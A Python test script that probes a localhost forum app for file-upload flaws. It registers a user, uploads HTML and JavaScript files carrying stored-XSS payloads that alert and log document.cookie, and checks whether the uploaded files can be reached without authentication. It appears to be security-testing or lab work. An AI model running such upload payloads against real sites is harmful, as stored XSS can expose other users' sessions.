#!/usr/bin/env python3
"""
Simple File Upload Vulnerability Test
This script demonstrates basic file upload exploitation
"""

import requests
import time

def test_exploit():
    base_url = "http://127.0.0.1:5000"
    session = requests.Session()
    
    print("🚨 TESTING FILE UPLOAD VULNERABILITIES")
    print("=" * 50)
    
    # Test 1: Register user
    print("\n[1] Registering test user...")
    username = f"test_user_{int(time.time())}"
    register_data = {
        'username': username,
        'password': 'testpass123'
    }
    
    try:
        response = session.post(f"{base_url}/register", data=register_data)
        if response.status_code == 200:
            print(f"✅ User registered: {username}")
        else:
            print(f"❌ Registration failed: {response.status_code}")
            return
    except Exception as e:
        print(f"❌ Connection error: {e}")
        print("Make sure the application is running on http://127.0.0.1:5000")
        return
    
    # Test 2: Login
    print("\n[2] Logging in...")
    login_data = {
        'username': username,
        'password': 'testpass123'
    }
    
    response = session.post(f"{base_url}/login", data=login_data)
    if "Forum Posts" in response.text:
        print("✅ Login successful")
    else:
        print("❌ Login failed")
        return
    
    # Test 3: Upload malicious HTML
    print("\n[3] Testing XSS via HTML upload...")
    malicious_html = """<!DOCTYPE html>
<html>
<head><title>XSS Test</title></head>
<body>
    <h1>🚨 XSS Test Successful!</h1>
    <script>
        alert('XSS Vulnerability Confirmed!');
        console.log('Cookies:', document.cookie);
    </script>
</body>
</html>"""
    
    files = {
        'file': ('test_xss.html', malicious_html, 'text/html')
    }
    
    response = session.post(f"{base_url}/upload", files=files)
    if "uploaded successfully" in response.text:
        print("✅ Malicious HTML uploaded!")
        print(f"🎯 Test XSS at: {base_url}/uploads/test_xss.html")
    else:
        print("❌ HTML upload failed")
    
    # Test 4: Upload malicious JavaScript
    print("\n[4] Testing JavaScript injection...")
    malicious_js = """
console.log('🚨 MALICIOUS JAVASCRIPT EXECUTED');
alert('JavaScript injection successful!');
console.log('Current URL:', window.location.href);
console.log('Cookies:', document.cookie);
"""
    
    files = {
        'file': ('test_payload.js', malicious_js, 'application/javascript')
    }
    
    response = session.post(f"{base_url}/upload", files=files)
    if "uploaded successfully" in response.text:
        print("✅ Malicious JavaScript uploaded!")
        print(f"🎯 Test JS at: {base_url}/uploads/test_payload.js")
    else:
        print("❌ JavaScript upload failed")
    
    # Test 5: Test direct file access
    print("\n[5] Testing direct file access...")
    unauthenticated_session = requests.Session()
    
    try:
        response = unauthenticated_session.get(f"{base_url}/uploads/test_xss.html")
        if response.status_code == 200:
            print("✅ Files accessible without authentication!")
        else:
            print(f"❌ File access denied: {response.status_code}")
    except Exception as e:
        print(f"❌ Error testing file access: {e}")
    
    print("\n" + "=" * 50)
    print("🎯 BASIC VULNERABILITY TEST COMPLETED")
    print("✅ File upload vulnerabilities confirmed!")
    print("⚠️  This demonstrates critical security flaws")
    print("=" * 50)

if __name__ == "__main__":
    test_exploit() 